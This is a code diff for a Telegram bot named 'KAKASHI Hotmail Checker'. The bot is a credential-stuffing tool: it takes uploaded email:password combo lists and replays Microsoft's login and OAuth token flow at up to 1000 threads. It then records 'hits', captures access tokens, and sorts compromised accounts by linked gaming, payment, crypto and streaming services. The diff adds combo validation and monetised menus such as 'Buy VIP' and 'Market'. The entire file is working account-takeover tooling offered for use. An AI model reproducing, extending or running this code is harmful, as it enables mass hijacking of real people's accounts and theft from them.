@@ -8,49 +8,42 @@ import threading
 import concurrent.futures
 import random
 import re
+import json
 from threading import Lock, Semaphore
 
 from colorama import init
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, ConversationHandler
 
-# Import services
 from services import services
 
-# ====================== BOT TOKEN FROM RAILWAY ======================
 TOKEN = os.getenv("TOKEN")
-
 if not TOKEN:
-    print("❌ CRITICAL ERROR: TOKEN environment variable is not set!")
+    print("❌ TOKEN set nahi hai!")
     sys.exit(1)
 
-print(f"✅ Token loaded successfully! Bot starting...")
+print("✅ Token loaded! Video style bot starting...")
 
-# ====================== GLOBAL COUNTERS ======================
 lock = threading.Lock()
-hit = 0
-bad = 0
-retry = 0
-total_combos = 0
-processed = 0
+hit = bad = retry = processed = total_combos = 0
 linked_accounts = {}
 checked_accounts = set()
 rate_limit_semaphore = Semaphore(500)
 progress_message_id = None
 
+user_data = {}
+
 init(autoreset=True)
 
-# Category wise services
 CATEGORIES = {
-    "Social Media": ["Facebook", "Instagram", "TikTok", "Twitter", "LinkedIn", "Pinterest", "Reddit", "Snapchat", "VK", "WeChat"],
-    "Messaging": ["WhatsApp", "Telegram", "Discord", "Signal", "Line"],
+    "Gaming": ["Steam", "Xbox", "PlayStation", "Epic Games", "Rockstar", "EA Sports", "Ubisoft", "Blizzard", "Riot Games", "Valorant", "Genshin Impact", "PUBG", "Free Fire", "Mobile Legends", "Call of Duty", "Fortnite", "Roblox", "Minecraft", "Supercell", "Nintendo", "Origin (EA)", "Battle.net", "GOG"],
     "Streaming": ["Netflix", "Spotify", "Twitch", "YouTube", "Vimeo", "Disney+", "Hulu", "HBO Max", "Amazon Prime", "Apple TV+", "Crunchyroll"],
-    "Shopping": ["Amazon", "eBay", "Shopify", "Etsy", "AliExpress", "Walmart", "Target", "Best Buy", "Newegg", "Wish"],
+    "Shopping": ["Amazon", "eBay", "Shopify", "Etsy", "AliExpress", "Walmart", "Target", "Best Buy", "Newegg", "Wish", "Shein", "Zalando", "Trendyol"],
     "Payment & Finance": ["PayPal", "Binance", "Coinbase", "Kraken", "Bitfinex", "OKX", "Bybit", "Bitkub", "Revolut", "TransferWise", "Venmo", "Cash App"],
-    "Gaming": ["Steam", "Xbox", "PlayStation", "EpicGames", "Rockstar", "EA Sports", "Ubisoft", "Blizzard", "Riot Games", "Valorant", "Genshin Impact", "PUBG", "Free Fire", "Mobile Legends", "Call of Duty", "Fortnite", "Roblox", "Minecraft", "Supercell", "Nintendo"],
+    "Social Media": ["Facebook", "Instagram", "TikTok", "Twitter", "LinkedIn", "Pinterest", "Reddit", "Snapchat", "VK", "WeChat"],
+    "Messaging": ["WhatsApp", "Telegram", "Discord", "Signal", "Line"]
 }
 
-# ====================== ANIMATED PROGRESS BAR (Video Style) ======================
 def create_progress_bar(percentage, length=25):
     filled = int(length * percentage / 100)
     bar = "█" * filled + "░" * (length - filled)
@@ -60,18 +53,18 @@ async def update_progress_message(context, chat_id):
     global progress_message_id
     while processed < total_combos and total_combos > 0:
         with lock:
-            progress_pct = min((processed / total_combos * 100), 100)
-            bar = create_progress_bar(progress_pct)
-            linked_total = sum(linked_accounts.values())
+            pct = min((processed / total_combos * 100), 100)
+            bar = create_progress_bar(pct)
+            linked = sum(linked_accounts.values())
             msg = f"""
-🔄 <b>LIVE PROGRESS</b>
+🔄 <b>SCANNING</b>
 {bar}
 
-📊 {processed}/{total_combos} combos checked
-✅ Hits: {hit}
-❌ Bad: {bad}
-🔄 Retries: {retry}
-🔗 Linked Services: {linked_total}
+📊 {processed}/{total_combos}
+✅ HIT: {hit}
+❌ BAD: {bad}
+🔄 RETRY: {retry}
+🔗 LINKED: {linked}
 """
         try:
             if progress_message_id:
@@ -81,14 +74,13 @@ async def update_progress_message(context, chat_id):
                 progress_message_id = sent.message_id
         except:
             pass
-        time.sleep(6)
+        time.sleep(5)
 
-# ====================== HELPER FUNCTIONS ======================
 def get_flag(country_name):
     try:
         country = pycountry.countries.lookup(country_name)
         return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
-    except LookupError:
+    except:
         return '🏳'
 
 def save_account_by_type(service_name, email, password):
@@ -161,40 +153,29 @@ def check_account(email, password):
         r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
         if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
             return {"status": "BAD"}
-        
         url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
         r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
-        
         url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
         ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
         if not url_match or not ppft_match:
             return {"status": "BAD"}
-        
         post_url = url_match.group(1).replace("\\/", "/")
         ppft = ppft_match.group(1)
-        
         login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
         r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Origin": "https://login.live.com","Referer": r2.url}, allow_redirects=False, timeout=15)
-        
         if any(x in r3.text.lower() for x in ["incorrect", "invalid", "error"]):
             return {"status": "BAD"}
-        
         location = r3.headers.get("Location", "")
         if not location:
             return {"status": "BAD"}
-        
         code_match = re.search(r'code=([^&]+)', location)
         if not code_match:
             return {"status": "BAD"}
-        
         code = code_match.group(1)
-        
         token_data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59","redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D","grant_type": "authorization_code","code": code,"scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
         r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
-        
         if r4.status_code != 200 or "access_token" not in r4.text:
             return {"status": "BAD"}
-        
         access_token = r4.json()["access_token"]
         mspcid = None
         for cookie in session.cookies:
@@ -202,7 +183,6 @@ def check_account(email, password):
                 mspcid = cookie.value
                 break
         cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
-        
         return {"status": "HIT", "token": access_token, "cid": cid}
     except requests.exceptions.Timeout:
         return {"status": "RETRY"}
@@ -229,50 +209,95 @@ def check_combo(email, password, context, update):
                 retry += 1
             processed += 1
 
-# ====================== SERVICE SELECTION (Video Style) ======================
-def category_keyboard():
+def validate_combo(file_path):
+    valid = []
+    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+        for line in f:
+            line = line.strip()
+            if ":" in line and "@" in line.split(":", 1)[0]:
+                valid.append(line)
+    with open(file_path, "w", encoding="utf-8") as f:
+        f.write("\n".join(valid) + "\n")
+    return len(valid)
+
+# ====================== MAIN MENU (Video Jaisa) ======================
+def main_menu_keyboard():
     keyboard = [
-        [InlineKeyboardButton("📱 Social Media", callback_data="cat_Social Media")],
-        [InlineKeyboardButton("💬 Messaging", callback_data="cat_Messaging")],
-        [InlineKeyboardButton("📺 Streaming", callback_data="cat_Streaming")],
-        [InlineKeyboardButton("🛒 Shopping", callback_data="cat_Shopping")],
-        [InlineKeyboardButton("💰 Payment & Finance", callback_data="cat_Payment & Finance")],
-        [InlineKeyboardButton("🎮 Gaming", callback_data="cat_Gaming")],
-        [InlineKeyboardButton("🌐 Select All Services", callback_data="select_all")]
+        [InlineKeyboardButton("🔑 Keywords", callback_data="menu_keywords"), InlineKeyboardButton("⚡ Speed", callback_data="menu_speed")],
+        [InlineKeyboardButton("📊 Stats Menu", callback_data="menu_stats"), InlineKeyboardButton("🎯 My Hits", callback_data="menu_hits")],
+        [InlineKeyboardButton("👤 My Profile", callback_data="menu_profile"), InlineKeyboardButton("🏆 Leaderboard", callback_data="menu_leaderboard")],
+        [InlineKeyboardButton("🌍 Global", callback_data="menu_global")],
+        [InlineKeyboardButton("📈 Live Stats", callback_data="menu_livestats"), InlineKeyboardButton("📋 Queue (0)", callback_data="menu_queue")],
+        [InlineKeyboardButton("🔴 Live Activity", callback_data="menu_activity")],
+        [InlineKeyboardButton("🎁 Loot Box", callback_data="menu_loot"), InlineKeyboardButton("🔄 Referral", callback_data="menu_referral")],
+        [InlineKeyboardButton("🛒 Market", callback_data="menu_market")],
+        [InlineKeyboardButton("🌐 Language", callback_data="menu_language"), InlineKeyboardButton("🛠 Tools", callback_data="menu_tools")],
+        [InlineKeyboardButton("💎 Buy VIP", callback_data="menu_vip")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
-def service_keyboard(category, selected):
-    services_list = CATEGORIES[category]
+# ====================== KEYWORDS MENU (Video Jaisa) ======================
+def keywords_keyboard(selected, page=0, per_page=10):
+    all_services = []
+    for cat_services in CATEGORIES.values():
+        all_services.extend(cat_services)
+    all_services = sorted(set(all_services))
+    start = page * per_page
+    end = start + per_page
+    current_page = all_services[start:end]
+
     keyboard = []
-    for srv in services_list:
+    for srv in current_page:
         status = "✅" if srv in selected else "⬜"
         keyboard.append([InlineKeyboardButton(f"{status} {srv}", callback_data=f"svc_{srv}")])
-    keyboard.append([InlineKeyboardButton("✅ Select All", callback_data=f"select_all_in_{category}")])
-    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_cat")])
-    keyboard.append([InlineKeyboardButton("✅ Done", callback_data="done_selection")])
+
+    nav = []
+    if page > 0:
+        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"page_{page-1}"))
+    if end < len(all_services):
+        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"page_{page+1}"))
+    if nav:
+        keyboard.append(nav)
+
+    keyboard.append([
+        InlineKeyboardButton("✅ Select All", callback_data="select_all_keywords"),
+        InlineKeyboardButton("❌ Deselect All", callback_data="deselect_all_keywords")
+    ])
+    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_main")])
+    keyboard.append([InlineKeyboardButton("✅ Done", callback_data="done_keywords")])
+
     return InlineKeyboardMarkup(keyboard)
 
-# ====================== CONVERSATION STATES ======================
+# ====================== HANDLERS ======================
 SELECT_CATEGORY, UPLOAD_COMBO, ENTER_THREADS = range(3)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global progress_message_id
     progress_message_id = None
-    context.user_data['selected_services'] = set()
-    await update.message.reply_text("🔥 <b>KAKASHI Hotmail MFC V7</b>\n\nSelect services first:", parse_mode='HTML', reply_markup=category_keyboard())
+    user_id = update.effective_user.id
+    if user_id not in user_data:
+        user_data[user_id] = {"selected_services": set(), "speed_mode": "Medium"}
+    context.user_data['selected_services'] = user_data[user_id]["selected_services"]
+    await update.message.reply_text("🔥 <b>Hotmail Checker</b>\n\nMain Menu:", parse_mode='HTML', reply_markup=main_menu_keyboard())
     return SELECT_CATEGORY
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
-    selected = context.user_data.get('selected_services', set())
+    user_id = query.from_user.id
+    if user_id not in user_data:
+        user_data[user_id] = {"selected_services": set(), "speed_mode": "Medium"}
+    selected = user_data[user_id]["selected_services"]
 
-    if data.startswith("cat_"):
-        category = data[4:]
-        context.user_data['current_category'] = category
-        await query.edit_message_text(f"📌 {category} Services:\nChoose which ones to check:", reply_markup=service_keyboard(category, selected))
+    if data == "menu_keywords":
+        context.user_data["current_page"] = 0
+        await query.edit_message_text("🔑 Keywords - Page 1/5\nSelect services:", reply_markup=keywords_keyboard(selected, 0))
+
+    elif data.startswith("page_"):
+        page = int(data[5:])
+        context.user_data["current_page"] = page
+        await query.edit_message_text(f"🔑 Keywords - Page {page+1}/5\nSelect services:", reply_markup=keywords_keyboard(selected, page))
 
     elif data.startswith("svc_"):
         service = data[4:]
@@ -280,32 +305,42 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             selected.remove(service)
         else:
             selected.add(service)
-        context.user_data['selected_services'] = selected
-        category = context.user_data.get('current_category')
-        await query.edit_message_text(f"📌 {category} Services:\nChoose which ones to check:", reply_markup=service_keyboard(category, selected))
+        page = context.user_data.get("current_page", 0)
+        await query.edit_message_text(f"🔑 Keywords - Page {page+1}/5\nSelect services:", reply_markup=keywords_keyboard(selected, page))
 
-    elif data.startswith("select_all_in_"):
-        category = data[14:]
-        for srv in CATEGORIES[category]:
-            selected.add(srv)
-        context.user_data['selected_services'] = selected
-        await query.edit_message_text(f"📌 {category} Services:\nChoose which ones to check:", reply_markup=service_keyboard(category, selected))
+    elif data == "select_all_keywords":
+        for cat in CATEGORIES.values():
+            selected.update(cat)
+        page = context.user_data.get("current_page", 0)
+        await query.edit_message_text(f"🔑 Keywords - Page {page+1}/5\nSelect services:", reply_markup=keywords_keyboard(selected, page))
 
-    elif data == "select_all":
-        for cat_services in CATEGORIES.values():
-            selected.update(cat_services)
-        context.user_data['selected_services'] = selected
-        await query.edit_message_text("🌐 All services have been selected!\nNow send your combo file (.txt)", reply_markup=None)
+    elif data == "deselect_all_keywords":
+        selected.clear()
+        page = context.user_data.get("current_page", 0)
+        await query.edit_message_text(f"🔑 Keywords - Page {page+1}/5\nSelect services:", reply_markup=keywords_keyboard(selected, page))
+
+    elif data == "done_keywords":
+        await query.edit_message_text(f"✅ {len(selected)} services selected!\nNow send your combo file (.txt)")
         return UPLOAD_COMBO
 
-    elif data == "back_to_cat":
-        await query.edit_message_text("🔥 Select services:", reply_markup=category_keyboard())
+    elif data == "back_to_main":
+        await query.edit_message_text("🔥 Hotmail Checker Main Menu", reply_markup=main_menu_keyboard())
 
-    elif data == "done_selection":
-        if not selected:
-            await query.edit_message_text("⚠️ Please select at least 1 service!", reply_markup=category_keyboard())
-            return SELECT_CATEGORY
-        await query.edit_message_text(f"✅ {len(selected)} services selected!\nNow send your combo file (.txt)")
+    elif data == "menu_speed":
+        keyboard = [
+            [InlineKeyboardButton("🐢 Slow", callback_data="speed_Slow")],
+            [InlineKeyboardButton("⚡ Medium (Recommended)", callback_data="speed_Medium")],
+            [InlineKeyboardButton("🚀 Fast", callback_data="speed_Fast")],
+            [InlineKeyboardButton("🔥 Turbo", callback_data="speed_Turbo")],
+            [InlineKeyboardButton("🧠 Deep Scan", callback_data="speed_Deep Scan")],
+            [InlineKeyboardButton("💎 VIP+ Ultra", callback_data="speed_VIP+ Ultra")]
+        ]
+        await query.edit_message_text("⚡ Choose Speed Mode:", reply_markup=InlineKeyboardMarkup(keyboard))
+
+    elif data.startswith("speed_"):
+        mode = data[6:]
+        user_data[user_id]["speed_mode"] = mode
+        await query.edit_message_text(f"✅ Speed set to {mode}!\nNow send combo file.", reply_markup=None)
         return UPLOAD_COMBO
 
     return SELECT_CATEGORY
@@ -314,8 +349,9 @@ async def receive_combo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.document:
         file = await update.message.document.get_file()
         await file.download_to_drive("combo.txt")
+        valid_count = validate_combo("combo.txt")
         context.user_data['combo_file'] = "combo.txt"
-        await update.message.reply_text("✅ Combo file received!\n\nSend number of threads (20-500 recommended):")
+        await update.message.reply_text(f"✅ Combo received! {valid_count} valid lines.\n\nSend threads number (20-500 recommended):")
         return ENTER_THREADS
     await update.message.reply_text("Please send combo as .txt file!")
     return UPLOAD_COMBO
@@ -326,11 +362,11 @@ async def receive_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not 1 <= threads <= 1000:
             raise ValueError
         context.user_data['threads'] = threads
-        await update.message.reply_text(f"🚀 Starting check with {threads} threads...\nAnimated live progress bar activated!")
+        await update.message.reply_text(f"🚀 Added to Queue! Position #1\nScanning will start automatically...")
         threading.Thread(target=run_checker, args=(context, update), daemon=True).start()
         return ConversationHandler.END
     except:
-        await update.message.reply_text("❌ Please send a valid number (1-1000)")
+        await update.message.reply_text("❌ Valid number (1-1000) bhejo")
         return ENTER_THREADS
 
 def run_checker(context, update):
@@ -344,11 +380,11 @@ def run_checker(context, update):
         lines = [line.strip() for line in f if ":" in line]
     total_combos = len(lines)
 
-    context.bot.send_message(update.effective_chat.id, f"📊 Total combos loaded: {total_combos}\nStarting check...")
+    context.bot.send_message(update.effective_chat.id, f"📊 Total combos: {total_combos}\nStarting check...")
 
     threading.Thread(target=update_progress_message, args=(context, update.effective_chat.id), daemon=True).start()
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=context.user_data.get('threads', 50)) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=context.user_data.get('threads', 80)) as executor:
         for line in lines:
             try:
                 email, pw = line.split(":", 1)
@@ -359,7 +395,6 @@ def run_checker(context, update):
     time.sleep(5)
     context.bot.send_message(update.effective_chat.id, f"✅ Check Completed!\nTotal Hits: {hit} | Bad: {bad} | Retries: {retry}")
 
-# ====================== MAIN ======================
 def main():
     if not os.path.exists("Accounts"):
         os.makedirs("Accounts")
@@ -377,7 +412,7 @@ def main():
     )
     
     app.add_handler(conv_handler)
-    print("🤖 KAKASHI Bot (Video Style) is running... Send /start")
+    print("🤖 KAKASHI Hotmail Checker (Exact Video Style) is running... Send /start")
     app.run_polling()
 
 if __name__ == "__main__":
